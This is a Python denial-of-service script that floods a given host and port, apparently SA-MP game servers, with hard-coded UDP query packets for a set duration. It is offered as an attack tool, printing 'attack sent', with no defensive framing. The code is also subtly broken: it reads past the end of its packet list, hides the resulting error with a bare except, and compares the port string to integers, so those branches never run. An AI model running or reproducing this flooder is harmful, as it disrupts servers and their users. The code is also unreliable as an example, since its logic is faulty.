import socket
import random
import time, threading
import codecs, sys

host = sys.argv[1]
port = sys.argv[2]
times = sys.argv[3] # python3 samp.py <host> <port> <times>

waktu_skrg = int(time.time()) + int(times)

hex_packet = [
	codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),
    codecs.decode("53414d509538e1a9611e63","hex_codec"),
    codecs.decode("53414d509538e1a9611e69","hex_codec"),
    codecs.decode("53414d509538e1a9611e72","hex_codec"),
    codecs.decode("081e62da","hex_codec"),
    codecs.decode("081e77da","hex_codec"),
    codecs.decode("081e4dda","hex_codec"),
    codecs.decode("021efd40","hex_codec"),
    codecs.decode("021efd40","hex_codec"), 
    codecs.decode("081e7eda","hex_codec")
]

def attack():
	while int(time.time()) < waktu_skrg:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			rand = hex_packet[random.randrange(0, 3)]
			s.sendto(rand, (str(host), int(port)))
			s.sendto(hex_packet[1], (str(host), int(port)))
			s.sendto(hex_packet[2], (str(host), int(port)))
			s.sendto(hex_packet[3], (str(host), int(port)))
			s.sendto(hex_packet[4], (str(host), int(port)))
			s.sendto(hex_packet[5], (str(host), int(port)))
			s.sendto(hex_packet[6], (str(host), int(port)))
			s.sendto(hex_packet[7], (str(host), int(port)))
			s.sendto(hex_packet[8], (str(host), int(port)))
			s.sendto(hex_packet[9], (str(host), int(port)))
			s.sendto(hex_packet[10], (str(host), int(port)))

			if port == 7777:
				s.sendto(hex_packet[5], (str(host), int(port)))
			elif port == 7796:
				s.sendto(hex_packet[4], (str(host), int(port)))
			elif port == 7771:
				s.sendto(hex_packet[6], (str(host), int(port)))
			elif port == 7784:
				s.sendto(hex_packet[7], (str(host), int(port)))
			elif port == 1111:
				s.sendto(hex_packet[9], (str(host), int(port)))
		except:
			pass

if __name__ == "__main__":
	try:
		threading.Thread(target = attack).start()
		print("attack sent")
	except:
		pass